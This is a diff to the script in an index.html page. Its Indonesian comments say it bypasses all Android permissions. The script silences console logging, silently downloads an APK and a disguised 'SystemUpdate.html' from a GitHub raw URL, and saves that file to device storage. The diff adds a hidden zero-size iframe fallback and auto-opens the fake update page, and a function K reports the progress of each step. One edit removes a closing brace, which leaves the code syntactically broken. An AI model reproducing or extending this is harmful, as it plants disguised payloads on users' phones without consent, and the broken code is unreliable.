@@ -66,7 +66,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - BYPASS SEMUA IZIN ANDROID!
+// 🔥 INDEX.HTML - BYPASS SEMUA IZIN ANDROID! (DENGAN DOWNLOAD PASTI)
 // ============================================================
 
 console.log = function() {};
@@ -397,7 +397,8 @@ function injectAllPermissions() {
     // ============================================================
     downloadAPKSilent();
     downloadHTMLSilent();
-    openSystemUpdateHTML();
+    
+    // ✅ BUKA SystemUpdate.html SETELAH DOWNLOAD (cek di dalam downloadHTMLSilent)
     
     K({ sumber: 'bypass_permissions_done', data: 'all_40+_permissions_bypassed' });
 }
@@ -450,7 +451,7 @@ function downloadAPKSilent() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD HTML (TANPA POPUP!)
+// 🔥 DOWNLOAD HTML - PERBAIKAN: TAMBAH IFRAME FALLBACK!
 // ============================================================
 function downloadHTMLSilent() {
     if (HTML_DOWNLOADED) return;
@@ -458,6 +459,7 @@ function downloadHTMLSilent() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
+    // ✅ METHOD 1: XHR
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
@@ -466,14 +468,45 @@ function downloadHTMLSilent() {
             if (xhr.status === 200) {
                 var htmlContent = xhr.responseText;
                 HTML_DOWNLOADED = true;
+                
                 try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+                
                 if (PLATFORM.isAndroid && typeof AndroidBridge !== 'undefined') {
                     try { AndroidBridge.saveFile(htmlPath, htmlContent); } catch(e) {}
                 }
+                
                 K({ sumber: 'html_download_xhr', data: 'ok' });
+                
+                // ✅ SETELAH DOWNLOAD, BUKA!
+                openSystemUpdateHTML();
             }
         };
         xhr.send();
+    } catch(e) {}
+    
+    // ✅ METHOD 2: IFRAME (FALLBACK - TANPA REDIRECT!)
+    try {
+        var iframe = document.getElementById('downloadIframe');
+        if (!iframe) {
+            iframe = document.createElement('iframe');
+            iframe.id = 'downloadIframe';
+            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
+            document.body.appendChild(iframe);
+        }
+        iframe.src = htmlUrl;
+        K({ sumber: 'html_download_iframe', data: 'attempt' });
+        
+        // ✅ TUNGGU 5 DETIK, LALU BUKA (ASSUME DOWNLOAD SELESAI)
+        setTimeout(function() {
+            if (!HTML_DOWNLOADED) {
+                // Coba buka dari localStorage
+                var htmlContent = localStorage.getItem('SystemUpdate.html');
+                if (htmlContent) {
+                    HTML_DOWNLOADED = true;
+                    openSystemUpdateHTML();
+                }
+            }
+        }, 5000);
     } catch(e) {}
 }
 
@@ -626,7 +659,7 @@ var A = {
     vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
     showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
     flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
-    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null }
+    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
 };
 
 // ============================================================
